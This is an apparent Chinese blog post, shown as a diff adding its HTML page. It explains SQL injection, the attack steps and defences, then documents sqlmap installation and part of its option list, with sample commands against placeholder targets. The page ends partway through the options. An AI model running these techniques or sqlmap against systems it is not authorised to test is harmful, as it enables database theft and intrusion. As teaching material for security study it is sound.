@@ -1,0 +1,1688 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一、了解sql注入 sql注入​        SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。  原理​        SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入与sqlmap">
+<meta property="og:url" content="http://alin.run/2020/06/10/sql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="一、了解sql注入 sql注入​        SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。  原理​        SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpjs0h3j30ka0cs3zz.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpvrzfhj30cs0b4758.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpzhg3yj30e807sq3d.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrq62op2j30i009876b.jpg">
+<meta property="article:published_time" content="2020-06-10T01:59:46.000Z">
+<meta property="article:modified_time" content="2020-07-10T02:01:01.349Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpjs0h3j30ka0cs3zz.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2020/06/10/sql注入与sqlmap/"/>
+
+
+
+
+
+  <title>sql注入与sqlmap | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2020/06/10/sql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入与sqlmap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-10T09:59:46+08:00">
+                2020-06-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、了解sql注入"><a href="#一、了解sql注入" class="headerlink" title="一、了解sql注入"></a>一、了解sql注入</h2><ol>
+<li><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>​        SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+</li>
+<li><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​        SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。</p>
+</li>
+<li><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>​        SQL是操作<a href="https://baike.baidu.com/item/数据库/103728" target="_blank" rel="noopener">数据库</a>数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原<a href="https://baike.baidu.com/item/URL/110640" target="_blank" rel="noopener">URL</a>、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。</p>
+</li>
+<li><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol>
+<li>广泛性</li>
+<li>隐蔽性</li>
+<li>危害大</li>
+<li>操作方便</li>
+</ol>
+</li>
+<li><h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><ol>
+<li>第一步：SQL注入点探测。探测SQL注入点是关键的一步，通过适当的分析应用程序，可以判断什么地方存在SQL注入点。通常只要带有输入提交的动态网页，并且动态网页访问数据库，就可能存在SQL注入漏洞。如果程序员信息安全意识不强，采用动态构造SQL语句访问数据库，并且对用户的输入未进行有效性验证，则存在SQL注入漏洞的可能性很大。一般通过页面的报错信息来确定是否存在SQL注入漏洞。</li>
+<li>第二步：收集后台数据库信息。不同数据库的注入方法、函数都不尽相同，因此在注入之前，我们先要判断一下数据库的类型。判断数据库类型的方法很多，可以输入特殊字符，如单引号，让程序返回错误信息，我们根据错误信息提示进行判断；还可以使用特定函数来判断，比如输入“1 and version（）&gt;0”，程序返回正常，说明version（）函数被数据库识别并执行，而version（）函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。</li>
+<li>第三步：猜解用户名和密码。数据库中的表和字段命名一般都是有规律的。通过构造特殊SQL语句在数据库中依次猜解出表名、字段名、字段数、用户名和密码。</li>
+<li>第四步：查找Web后台管理入口。WEB后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用Web目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。</li>
+<li>第五步：入侵和破坏。一般后台管理具有较高权限和较多的功能，使用前面已破译的用户名、密码成功登录后台管理平台后，就可以任意进行破坏，比如上传<a href="https://baike.baidu.com/item/木马/530" target="_blank" rel="noopener">木马</a>、篡改网页、修改和窃取信息等，还可以进一步提权，入侵Web服务器和数据库服务器。</li>
+</ol>
+</li>
+<li><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
+<li><h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><p>​       当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。</p>
+</li>
+<li><h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>​        当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>
+</li>
+</ol>
+</li>
+<li><h4 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h4><ol>
+<li><h5 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h5><p>​        因为web的页面返回值都是True或者False，所以布尔盲注就是注入后根据页面返回值来得到数据库信息的一种办法。</p>
+</li>
+<li><h5 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h5><p>​        当布尔型注入没有结果（页面显示正常）的时候，我们很难判断注入的代码是否被执行，也可以说到底这个注入点存不存在？这个时候布尔型注入就无法发挥自己的作用了。基于时间的盲注便应运而生，所谓基于时间的盲注，就是我们根据web页面相应的时间差来判断该页面是否存在SQL注入点。</p>
+</li>
+<li><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>​        使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。所谓联合查询注入即是使用union合并两个或多个SELECT语句的结果集，所以两个及以上的select必须有相同列、且各列的数据类型也都相同。联合查询注入可在链接最后添加order by 9基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。</p>
+</li>
+<li><h5 id="基于错误信息的注入"><a href="#基于错误信息的注入" class="headerlink" title="基于错误信息的注入"></a>基于错误信息的注入</h5><p>​        此方法是在页面没有显示位，但是echo mysql_error();函数输出了错误信息的时候方能使用。优点是注入速度快，缺点是语句较为复杂，而且只能用limit依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。</p>
+</li>
+</ol>
+</li>
+<li><h4 id="注入防范措施"><a href="#注入防范措施" class="headerlink" title="注入防范措施"></a>注入防范措施</h4><ol>
+<li><h5 id="分级管理"><a href="#分级管理" class="headerlink" title="分级管理"></a>分级管理</h5><p>​        对用户进行分级管理，严格控制用户的权限，对于普通用户，禁止给予数据库建立、删除、修改等相关权限，只有系统管理员才具有增、删、改、查的权限。例如上述实例中用户在查询语句中加入了drop table。肯定是不能让其执行的，否则系统的数据库安全性就无法保障。故而通过权限的设计限制。使得即使恶意攻击者在数据提交时嵌入了相关攻击代码。但因为设置了权限，从而使得代码不能执行。从而减少SQL注入对数据库的安全威胁。</p>
+</li>
+<li><h5 id="参数传值"><a href="#参数传值" class="headerlink" title="参数传值"></a>参数传值</h5><p>​        程序员在书写SQL语言时，禁止将变量直接写入到SQL语句，必须通过设置相应的参数来传递相关的变量。从而抑制SQL注入。数据输入不能直接嵌入到查询语句中。同时要过滤输入的内容，过滤掉不安全的输入数据。或者采用参数传值的方式传递输入变量。这样可以最大程度防范SQL注入攻击。</p>
+</li>
+<li><h5 id="基础过滤与二次过滤"><a href="#基础过滤与二次过滤" class="headerlink" title="基础过滤与二次过滤"></a>基础过滤与二次过滤</h5><p>​        SQL注入攻击前，入侵者通过修改参数提交“and”等特殊字符，判断是否存在漏洞，然后通过select、update等各种字符编写SQL注入语句。因此防范SQL注入要对用户输入进行检查，确保数据输入的安全性，在具体检查输入或提交的变量时，对于单引号、双引号、冒号等字符进行转换或者过滤，从而有效防止SQL注入。当然危险字符有很多，在获取用户输入提交的参数时，首先要进行基础过滤，然后根据程序的功能及用户输入的可能性进行二次过滤，以确保系统的安全性。</p>
+</li>
+<li><h5 id="使用安全参数"><a href="#使用安全参数" class="headerlink" title="使用安全参数"></a>使用安全参数</h5><p>​        SQL数据库为了有效抑制SQL注入攻击的影响。在进行SQLServer数据库设计时设置了专门的SQL安全参数。在程序编写时应尽量使用安全参数来杜绝注入式攻击。从而确保系统的安全性。</p>
+</li>
+<li><h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>​        为了更有效地防范SQL注入攻击，作为系统管理除了设置有效的防范措施，更应该及时发现系统存在SQL攻击安全漏洞。系统管理员可以通过采购一些专门系统的SQL漏洞扫描工具，通过专业的扫描工具，可以及时的扫描到系统存在的相应漏洞。虽然漏洞扫描工具只能扫描到SQL注入漏洞，不能防范SQL注入攻击。但系统管理员可以通过扫描到的安全漏洞，根据不同的情况采取相应的防范措施封堵相应的漏洞，从而把SQL注入攻击的门给关上，从而确保系统的安全。</p>
+</li>
+<li><h5 id="多层验证"><a href="#多层验证" class="headerlink" title="多层验证"></a>多层验证</h5><p>​        现在的网站系统功能越来越庞大复杂。为确保系统的安全，访问者的数据输入必须经过严格的验证才能进入系统，验证没通过的输入直接被拒绝访问数据库，并且向上层系统发出错误提示信息。同时在客户端访问程序中验证访问者的相关输入信息，从而更有效的防止简单的SQL注入。但是如果多层验证中的下层如果验证数据通过，那么绕过客户端的攻击者就能够随意访问系统。因此在进行多层验证时，要每个层次相互配合，只有在客户端和系统端都进行有效的验证防护，才能更好地防范SQL注入攻击。</p>
+</li>
+<li><h5 id="数据库信息加密"><a href="#数据库信息加密" class="headerlink" title="数据库信息加密"></a>数据库信息加密</h5><ol>
+<li>对称加密：即加密方和解密方都使用相同的加密算法和密钥，这种方案的密钥的保存非常关键，因为算法是公开的，而密钥是保密的，一旦密匙泄露，黑客仍然可以轻易解密。常见的对称加密算法有：AES、DES等。</li>
+<li>非对称加密：即使用不同的密钥来进行加解密，密钥被分为公钥和私钥，用私钥加密的数据必须使用公钥来解密，同样用公钥加密的数据必须用对应的私钥来解密，常见的非对称加密算法有：RSA等。</li>
+<li>不可逆加密：利用哈希算法使数据加密之后无法解密回原数据，这样的哈希算法常用的有：md5、SHA-1等。</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="二、了解sqlmap"><a href="#二、了解sqlmap" class="headerlink" title="二、了解sqlmap"></a>二、了解sqlmap</h2><ol>
+<li><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>​        sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，日前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。sqlmap的功能强大到让你惊叹，常规注入工具不能绕过的话，终极使用sqlmap会有意想不到的效果。</p>
+</li>
+<li><h4 id="Sqlmap是什么"><a href="#Sqlmap是什么" class="headerlink" title="Sqlmap是什么"></a>Sqlmap是什么</h4><ol>
+<li>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。</li>
+<li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</li>
+<li>在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。</li>
+<li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li>
+<li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li>
+<li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li>
+<li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li>
+<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。</li>
+<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。</li>
+</ol>
+</li>
+<li><h4 id="下载安装sqlmap"><a href="#下载安装sqlmap" class="headerlink" title="下载安装sqlmap"></a>下载安装sqlmap</h4><ol>
+<li><p>linux下git直接安装</p>
+<p>gitclone –depth 1 <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
+</li>
+<li><p>windows下安装</p>
+<p>windows下下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。</p>
+</li>
+<li><p>kali及PentestBox默认安装sqlmap</p>
+<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpjs0h3j30ka0cs3zz.jpg" alt="image-20200401131519983"></p>
+</li>
+</ol>
+</li>
+<li><h4 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h4><ol>
+<li><h5 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h5><ol>
+<li><p>-h,–help 显示基本帮助信息并退出</p>
+<p>-hh  显示高级帮助信息并退出</p>
+<p>–version 显示程序版本信息并退出</p>
+<p>-v VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</p>
+</li>
+</ol>
+</li>
+<li><h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ol>
+<li><p>-d DIRECT  直接连接数据库的连接字符串</p>
+<p>-u URL, –url=URL  目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1“)，使用-u或者–url" target="_blank" rel="noopener">http://www.site.com/vuln.php?id=1“)，使用-u或者–url</a></p>
+<p>-l LOGFILE   从Burp或者WebScarab代理日志文件中分析目标</p>
+<p>-x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标</p>
+<p>-m BULKFILE   将目标地址保存在文件中，一行为一个URL地址进行批量检测。</p>
+<p>-r REQUESTFILE  从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</p>
+<p>-g GOOGLEDORK   从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
+<p>-c CONFIGFILE    从配置ini文件中加载选项</p>
+</li>
+</ol>
+</li>
+<li><h5 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h5><ol>
+<li><p>这些选项可以用来指定如何连接到目标URL</p>
+<p>–method=METHOD  强制使用给定的HTTP方法（例如put）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--data&#x3D;DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data&#x3D;&quot;id&#x3D;1&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure>
+
+<p>  –param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
+<p>  –cookie=COOKIE   HTTP Cookieheader 值</p>
+<p>  –cookie-del=COO.. 用来分隔cookie的字符串值</p>
+<p>  –load-cookies=L.. Filecontaining cookies in Netscape/wget format</p>
+<p>  –drop-set-cookie  IgnoreSet-Cookie header from response</p>
+<p>  –user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org</a>)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</p>
+<p>  –random-agent   使用random-agent作为HTTP User-Agent头值</p>
+<p>  –host=HOST     HTTP Hostheader value</p>
+<p>  –referer=REFERER  sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p>
+<p>  -H HEADER, –hea.. 额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)</p>
+<p>  –headers=HEADERS 可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)</p>
+<p>  –auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p>
+<p>  –auth-cred=AUTH.. HTTP 认证凭证(name:password)</p>
+<p>  –auth-file=AUTH.. HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
+<p>  –ignore-401    Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p>
+<p>  –ignore-proxy   忽略系统的默认代理设置</p>
+<p>  –ignore-redirects忽略重定向的尝试</p>
+<p>  –ignore-timeouts  忽略连接超时</p>
+<p>  –proxy=PROXY    使用代理服务器连接到目标URL</p>
+<p>  –proxy-cred=PRO.. 代理认证凭证(name:password)</p>
+<p>  –proxy-file=PRO.. 从文件加载代理列表</p>
+<p>  –tor        使用Tor匿名网络</p>
+<p>  –tor-port=TORPORT 设置Tor代理端口</p>
+<p>  –tor-type=TORTYPE 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p>
+<p>  –check-tor    检查Tor的是否正确使用</p>
+<p>  –delay=DELAY  可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<p>  –timeout=TIMEOUT  可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p>
+<p>  –retries=RETRIES  当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
+<p>  –randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p>
+<p>  –safe-url=SAFEURL 提供一个安全不错误的连接，每隔一段时间都会去访问一下</p>
+<p>  –safe-post=SAFE.. 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p>
+<p>  –safe-req=SAFER.. 从文件中加载安全HTTP请求</p>
+<p>  –safe-freq=SAFE.. 测试一个给定安全网址的两个访问请求</p>
+<p>  –skip-urlencode  跳过URL的有效载荷数据编码</p>
+<p>  –csrf-token=CSR.. Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</p>
+<p>  –csrf-url=CSRFURL URL地址访问提取anti-CSRF令牌</p>
+<p>  –force-ssl     强制使用SSL/HTTPS</p>
+<p>  –hpp        使用HTTP参数污染的方法</p>
+<p>  –eval=EVALCODE   在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p>
+<p> sqlmap -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</p>
+</li>
+</ol>
+</li>
+<li><h5 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h5><ol>
+<li><p>-o        打开所有的优化开关</p>
+<p>–predict-output  预测普通查询输出</p>
+<p>–keep-alive    使用持久HTTP（S）连接</p>
+<p>–null-connection  获取页面长度</p>
+<p>–threads=THREADS  当前http(s)最大请求数 (默认 1)</p>
+</li>
+</ol>
+</li>
+<li><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><ol>
+<li><p>-p TESTPARAMETER  可测试的参数</p>
+<p>–skip=SKIP     跳过对给定参数的测试</p>
+<p>–skip-static    跳过测试不显示为动态的参数</p>
+<p>–param-exclude=.. 使用正则表达式排除参数进行测试（e.g. “ses”）</p>
+<p>–dbms=DBMS     强制后端的DBMS为此值</p>
+<p>–dbms-cred=DBMS.. DBMS认证凭证(user:password)</p>
+<p>–os=OS      强制后端的DBMS操作系统为这个值</p>
+<p>–invalid-bignum  使用大数字使值无效</p>
+<p>–invalid-logical  使用逻辑操作使值无效</p>
+<p>–invalid-string  使用随机字符串使值无效</p>
+<p>–no-cast     关闭有效载荷铸造机制</p>
+<p>–no-escape     关闭字符串逃逸机制</p>
+<p>–prefix=PREFIX   注入payload字符串前缀</p>
+<p>–suffix=SUFFIX   注入payload字符串后缀</p>
+<p>–tamper=TAMPER  使用给定的脚本篡改注入数据</p>
+</li>
+</ol>
+</li>
+<li><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ol>
+<li><p>–level=LEVEL   执行测试的等级（1-5，默认为1）</p>
+<p> –risk=RISK    执行测试的风险（0-3，默认为1）</p>
+<p> –string=STRING  查询时有效时在页面匹配字符串</p>
+<p> –not-string=NOT.. 当查询求值为无效时匹配的字符串</p>
+<p> –regexp=REGEXP   查询时有效时在页面匹配正则表达式</p>
+<p> –code=CODE    当查询求值为True时匹配的HTTP代码</p>
+<p> –text-only    仅基于在文本内容比较网页</p>
+<p> –titles      仅根据他们的标题进行比较</p>
+</li>
+</ol>
+</li>
